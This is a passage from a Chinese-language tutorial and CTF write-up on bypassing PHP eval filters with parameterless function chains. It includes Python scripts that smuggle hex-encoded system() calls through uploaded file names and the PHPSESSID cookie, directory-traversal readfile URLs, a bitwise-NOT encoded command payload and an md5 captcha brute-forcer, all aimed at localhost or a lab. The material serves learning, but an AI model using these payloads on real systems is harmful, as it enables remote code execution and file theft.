<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016203842669.png" alt="image-20231016203842669"></p>
<p>这样一来相当于我们将http header中的hybcx变成了我们的参数，可用其进行bypass无参数函数执行，如下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016204049031.png" alt="image-20231016204049031"></p>
<p>这里又针对eval的问题做了一波探讨，这里我当初疑惑为何非要在传参的地方加上eval先执行一次，代码中不就有eval吗，为何这里需要套娃（但是传参的时候没有eval就不能成功执行phpinfo），于是询问了一波GPT，首先我们要清楚eval函数的参数必须是一个可执行的PHP代码，如果只是一个单纯的字符串时会报错无法执行的。</p>
<p>而这里我们如果只是传入end(getallheaders())，这两个函数的意思只是单纯的取出header头信息的最后一个元素，也就是一个数组操作，而这个，而我们的正则表达式是只会匹配：满足函数调用的参数内容，也就是需要前面是一个代码执行函数的意思，这里呢当然就是eval。emmm可能我说的不清楚，这里附上GPT回答，可能会好些：</p>
<pre><code class="hljs plaintext">我明白你的疑虑。在PHP中，`end(getallheaders())` 不会被认为是函数调用，因为这个表达式仅返回`getallheaders()`的结果的最后一个元素，并没有直接调用函数。因此，它不包含函数调用，而是一个数组操作。

在你的示例中，确实只传入了 `end(getallheaders())` 而没有执行，因为它不满足条件检查的要求。我之前的回答中有一些混淆，我为此道歉。你的条件检查是基于正则表达式来查找包含函数调用的字符串，所以只有包含函数调用的字符串会满足条件。

如果你传入的参数中只包含 `end(getallheaders())`，它不会被认为是函数调用，因此不会执行 `eval()` 中的代码。

总之，你的示例代码要求 `$_GET['code']` 参数中包含有效的函数调用，才会执行 `eval($_GET['code'])` 中的代码。 `end(getallheaders())` 不包含函数调用，因此不满足这个要求。</code></pre>
<p>回到正题，我们进一步获取<code>RCE</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016212802119.png" alt="image-20231016212802119"></p>
<ul>
<li>非<code>apache</code>中间件-这里借用其他师傅的图了</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016212837486.png" alt="image-20231016212837486"></p>
<h2 id="42-get_defined_vars">4.2 get_defined_vars()</h2>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016213051418.png" alt="image-20231016213051418"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016213255596.png" alt="image-20231016213255596"></p>
<p>可以回显的全局变量</p>
<pre><code class="hljs php"><span class="hljs-variable">$_GET</span>
<span class="hljs-variable">$_POST</span>
<span class="hljs-variable">$_FILES</span>
<span class="hljs-variable">$_COOKIE</span></code></pre>
<p>尝试RCE</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016213725558.png" alt="image-20231016213725558"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016213818955.png" alt="image-20231016213818955"></p>
<p>如上图我们end取到最后一个元素</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016213844304.png" alt="image-20231016213844304"></p>
<p>eval直接执行</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016213900725.png" alt="image-20231016213900725"></p>
<ul>
<li>如果服务器 对 <code>$_GET</code> <code>$_POST</code> <code>$_COOKIE</code> 进行了全局过滤，可以从 <code>$_FILES</code>下手</li>
</ul>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO

payload = <span class="hljs-string">"system('calc.exe');"</span>.encode(<span class="hljs-string">'hex'</span>)
files = {
  payload: BytesIO(<span class="hljs-string">'hybcx'</span>)
}

r = requests.post(<span class="hljs-string">'http://localhost/eval.php?var=eval(hex2bin(array_rand(end(get_defined_vars()))));'</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)
	
<span class="hljs-built_in">print</span> r.content</code></pre>
<h2 id="43-session_id">4.3 session_id()</h2>
<ul>
<li>php中对此函数的解释</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016215917779.png" alt="image-20231016215917779"></p>
<p>可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即<code>hex2bin</code></p>
<p>payload：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests

payload = <span class="hljs-string">"system('calc.exe');"</span>.encode(<span class="hljs-string">'hex'</span>)
cookies = {
  <span class="hljs-string">'PHPSESSID'</span>: payload
}

r = requests.get(<span class="hljs-string">'http://localhost/eval.php?var=eval(hex2bin(session_id(session_start())));'</span>, cookies=cookies)

<span class="hljs-built_in">print</span> r.content</code></pre>
<p>即可达成RCE和bypass的目的</p>
<h2 id="44-getenv">4.4 getenv()</h2>
<p>查阅php手册，有非常多的超全局变量</p>
<pre><code class="hljs php"><span class="hljs-variable">$GLOBALS</span>
<span class="hljs-variable">$_SERVER</span>
<span class="hljs-variable">$_GET</span>
<span class="hljs-variable">$_POST</span>
<span class="hljs-variable">$_FILES</span>
<span class="hljs-variable">$_COOKIE</span>
<span class="hljs-variable">$_SESSION</span>
<span class="hljs-variable">$_REQUEST</span>
<span class="hljs-variable">$_ENV</span></code></pre>
<p>我们可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019195234019.png" alt="image-20231019195234019"></p>
<p>虽然<code>getenv()</code>可获取当前环境变量，但我们怎么从一个偌大的数组中取出我们指定的值成了问题</p>
<p>这里可以使用方法：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019195339401.png" alt="image-20231019195339401"></p>
<p>效果如下：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019195911649.png" alt="image-20231019195911649"></p>
<p>但我们要的是数组的值，那使用如下函数</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019200007448.png" alt="image-20231019200007448"></p>
<p>两者结合便可以展示出值</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019200202048.png" alt="image-20231019200202048"></p>
<p>我们则可用爆破的方式获取数组中任意位置需要的值，即，可使用getenv()，并获取指定位置的恶意参数</p>
<h2 id="45-目录操作相关">4.5 目录操作相关</h2>
<ul>
<li>可以用相关函数进行目录遍历&amp;&amp;任意文件读取</li>
</ul>
<p>相关函数</p>
<ul>
<li><code>getcwd()</code>当前目录</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016220203860.png" alt="image-20231016220203860"></p>
<ul>
<li><code>scandir()</code> 目录扫描</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016220319247.png" alt="image-20231016220319247"></p>
<ul>
<li><code>dirname()</code> 目录穿越，这里实际上就是返回到了上级目录<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016220823827.png" alt="image-20231016220823827"></li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016220421631.png" alt="image-20231016220421631"></p>
<ul>
<li><code>chdir()</code> 更改当前目录</li>
<li>读取上一层的特定文件</li>
</ul>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016222011790.png" alt="image-20231016222011790"></p>
<p>这里没有复现成功，先借用其他师傅的图片了，感觉原因在于</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016222804839.png" alt="image-20231016222804839"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231016222834646.png" alt="image-20231016222834646"></p>
<p>这里感觉上述最后的复现很模糊不清楚，这里又找了几篇文章来学习</p>
<p>首先，我们可以利用<code>getcwd()</code>获取当前目录</p>
<pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());

<span class="hljs-keyword">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">"/var/www/html"</span></code></pre>
<p>那么怎么进行当前目录的目录遍历呢？</p>
<p>这里用<code>scandir()</code>即可</p>
<pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()));

<span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) { [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">"."</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">"index.php"</span> }</code></pre>
<p>那么既然不在这一层目录，如何进行目录跳转呢？</p>
<p>我们用<code>dirname()</code>即可</p>
<pre><code class="hljs php">?code=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));

<span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) { [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">"."</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">".."</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">"flag_phpbyp4ss"</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">"html"</span> }</code></pre>
<p>那么怎么更改我们的当前目录呢？这里我们发现有函数可以更改当前目录</p>
<pre><code class="hljs plaintext">chdir ( string $directory ) : bool</code></pre>
<p>将 PHP 的当前目录改为 directory。<br>
所以我们这里在</p>
<pre><code class="hljs plaintext">dirname(getcwd())</code></pre>
<p>进行如下设置即可</p>
<pre><code class="hljs plaintext">chdir(dirname(getcwd()))</code></pre>
<p>我们尝试读取<code>/var/www/123</code></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019201247981.png" alt="image-20231019201247981"></p>
<pre><code class="hljs plaintext">http://localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019201318921.png" alt="image-20231019201318921"></p>
<p>即可进行文件读取</p>
<h1 id="0x05-相关函数总结">0x05 相关函数总结</h1>
<pre><code class="hljs plaintext">1. getcwd()：取得当前工作目录，成功则返回当前工作目录，失败返回 FALSE。

2. dirname()：返回路径中的目录部分，返回 path 的父目录。 如果在 path 中没有斜线，则返回一个点（’.‘），表示当前目录。否则返回的是把 path 中结尾的 /component（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。

3. chdir()：改变目录，成功时返回 TRUE， 或者在失败时返回 FALSE。

4. scandir()：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 FALSE。如果 directory 不是个目录，则返回布尔值 FALSE 并生成一条 E_WARNING 级的错误。

5. array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。

6. array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。

7. localeconv()：返回一包含本地数字及货币格式信息的数组。而数组第一项就是 .</code></pre>
<h2 id="51-phpversion">5.1 phpversion()</h2>
<ul>
<li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li>
<li><code>floor(phpversion())</code>返回<code>7</code></li>
<li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li>
<li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li>
<li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li>
<li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li>
<li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li>
<li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li>
<li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li>
<li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li>
</ul>
<p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p>
<h2 id="52-crypt">5.2 crypt()</h2>
<pre><code class="hljs plaintext">chr(ord(hebrevc(crypt(phpversion()))))`返回`.</code></pre>
<ul>
<li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li>
</ul>
<p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p>
<p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p>
<h2 id="53-数组操作">5.3 数组操作</h2>
<pre><code class="hljs plaintext">end() ： 将内部指针指向数组中的最后一个元素，并输出
next() ：将内部指针指向数组中的下一个元素，并输出
prev() ：将内部指针指向数组中的上一个元素，并输出
reset() ： 将内部指针指向数组中的第一个元素，并输出
each() ： 返回当前元素的键名和键值，并将内部指针向前移动</code></pre>
<h2 id="54-目录操作">5.4 目录操作</h2>
<pre><code class="hljs plaintext">getchwd() ：函数返回当前工作目录。
scandir() ：函数返回指定目录中的文件和目录的数组。
dirname() ：函数返回路径中的目录部分。
chdir() ：函数改变当前的目录。</code></pre>
<h1 id="0x06-实战操作">0x06 实战操作</h1>
<h2 id="极客大挑战-2020roamphp4-rceme">[极客大挑战 2020]Roamphp4-Rceme</h2>
<p>这里在buuctf打开访问</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019202912045.png" alt="image-20231019202912045"></p>
<p>直接先dirsearch扫一波目录，这里扫出一个swp泄露，访问/.index.php.swp访问得到，不过打开文件之后发现乱码，这里用vim还原一下，发现如下代码</p>
<p><code>vim -r index.php.swp</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-comment">//判断是否存在code的session变量，不存在的话随机生成5位md5字符串</span>
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'code'</span>])){
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'code'</span>] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-title function_ invoke__">sha1</span>(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);
}

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'cmd'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>])){

    <span class="hljs-comment">//判断post传入的code是否与生成的验证码相同</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) !== <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'code'</span>]){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'&lt;script&gt;alert(\'Captcha error~\');history.back()&lt;/script&gt;'</span>);
    }
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'code'</span>] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-title function_ invoke__">sha1</span>(mt_rand)),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);
    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'cmd'</span>];
    <span class="hljs-comment">//判断code长度以及利用正则匹配限制code传参内容，这里几乎全过滤了，但是没有过滤取反字符，这已经在提示我们了</span>
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>) &gt; <span class="hljs-number">70</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm'</span>,<span class="hljs-variable">$code</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'&lt;script&gt;alert(\'Longlone not like you~\');history.back()&lt;/script&gt;'</span>);
        <span class="hljs-comment">//这里就是常规的无参RCE题目的正则过滤表达式</span>
    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\s\(\)]+?\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$code</span>)){
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);
        <span class="hljs-keyword">die</span>();
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>我们传入的命令中不能有以下 ，</p>
<pre><code class="hljs plaintext">/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/，</code></pre>
<p>想到是无字母数字，过滤了 异或 和或，留了取反，同时我们的函数必须是无参的。</p>
<p>这里先上一个md5碰撞绕过验证码的脚本</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib
a=<span class="hljs-built_in">input</span>(<span class="hljs-string">"请输入您要爆破的md5:"</span>)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200000000</span>):

    x=hashlib.md5(<span class="hljs-built_in">str</span>(i).encode(encoding=<span class="hljs-string">'UTF-8'</span>)).hexdigest()

    <span class="hljs-keyword">if</span> (x[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]==a):
        <span class="hljs-built_in">print</span>(x)
        <span class="hljs-built_in">print</span>(i)
        <span class="hljs-keyword">break</span></code></pre>
<p>我们先用getallheaders函数看一下当前环境变量，当然在输入的时候要进行url编码取反，这里编码推荐bp自带的</p>
<p>payload：</p>
<pre><code class="hljs plaintext">原型为: var_dump(getallheaders())

cmd=[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]());</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231019212815605.png" alt="image-20231019212815605"></p>
<p>很好我们直接尝试修改ua头，因为这里host肯定不能修改，我们可以用next函数使指针指向下一位</p>
<pre><code class="hljs plaintext">原型为: system(next(getallheaders()))

